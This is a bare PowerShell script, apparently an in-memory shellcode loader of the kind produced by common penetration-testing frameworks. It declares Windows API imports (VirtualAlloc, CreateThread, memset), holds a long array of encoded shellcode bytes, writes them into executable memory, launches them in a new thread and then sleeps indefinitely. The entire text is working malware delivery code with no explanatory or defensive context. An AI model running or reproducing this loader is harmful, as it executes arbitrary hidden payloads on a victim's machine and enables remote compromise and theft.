
$aLDy = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $aLDy -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xed,0x96,0x04,0x41,0xdb,0xda,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x4f,0x31,0x43,0x14,0x83,0xeb,0xfc,0x03,0x43,0x10,0x0f,0x63,0xf8,0xa9,0x4d,0x8c,0x01,0x2a,0x31,0x04,0xe4,0x1b,0x71,0x72,0x6c,0x0b,0x41,0xf0,0x20,0xa0,0x2a,0x54,0xd1,0x33,0x5e,0x71,0xd6,0xf4,0xd4,0xa7,0xd9,0x05,0x44,0x9b,0x78,0x86,0x96,0xc8,0x5a,0xb7,0x59,0x1d,0x9a,0xf0,0x87,0xec,0xce,0xa9,0xcc,0x43,0xff,0xde,0x98,0x5f,0x74,0xac,0x0d,0xd8,0x69,0x65,0x2c,0xc9,0x3f,0xfd,0x77,0xc9,0xbe,0xd2,0x0c,0x40,0xd9,0x37,0x28,0x1a,0x52,0x83,0xc7,0x9d,0xb2,0xdd,0x28,0x31,0xfb,0xd1,0xdb,0x4b,0x3b,0xd5,0x03,0x3e,0x35,0x25,0xbe,0x39,0x82,0x57,0x64,0xcf,0x11,0xff,0xef,0x77,0xfe,0x01,0x3c,0xe1,0x75,0x0d,0x89,0x65,0xd1,0x12,0x0c,0xa9,0x69,0x2e,0x85,0x4c,0xbe,0xa6,0xdd,0x6a,0x1a,0xe2,0x86,0x13,0x3b,0x4e,0x69,0x2b,0x5b,0x31,0xd6,0x89,0x17,0xdc,0x03,0xa0,0x75,0x89,0xe0,0x89,0x85,0x49,0x6e,0x99,0xf6,0x7b,0x31,0x31,0x91,0x37,0xba,0x9f,0x66,0x37,0x91,0x58,0xf8,0xc6,0x19,0x99,0xd0,0x0c,0x4d,0xc9,0x4a,0xa4,0xed,0x82,0x8a,0x49,0x38,0x04,0xdb,0xe5,0x92,0xe5,0x8b,0x45,0x42,0x8e,0xc1,0x49,0xbd,0xae,0xe9,0x83,0xd6,0xc7,0x00,0x2c,0xd8,0x17,0x44,0x5f,0xb7,0x6e,0xfa,0xfb,0x35,0xfc,0x6a,0x6b,0xca,0x8a,0x44,0x17,0x48,0x1d,0xea,0xf9,0xfe,0x84,0x78,0x06,0x96,0xef,0xa9,0x32,0xe6,0x0f,0x7c,0xb1,0xa6,0xf3,0x15,0xc3,0x76,0x64,0xe8,0xcb,0x67,0x28,0x65,0x2d,0xed,0xc0,0x23,0xe5,0x99,0x79,0x6e,0x7d,0x38,0x85,0xa4,0xfb,0x7a,0x0d,0x4b,0xfb,0x34,0xe6,0x26,0xef,0xa0,0x06,0x7d,0x4d,0x66,0x18,0xab,0xf8,0x86,0x8c,0x50,0xab,0xd1,0x38,0x5b,0x8a,0x15,0xe7,0xa4,0xf9,0x2e,0x2e,0x31,0x42,0x58,0x4f,0xd5,0x42,0x98,0x19,0xbf,0x42,0xf0,0xfd,0x9b,0x10,0xe5,0x01,0x36,0x05,0xb6,0x97,0xb9,0x7c,0x6b,0x3f,0xd2,0x82,0x52,0x77,0x7d,0x7c,0xb1,0x89,0x41,0xab,0xff,0xff,0xab,0x6f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BA82=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BA82.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BA82,0,0,0);for (;;){Start-sleep 60};
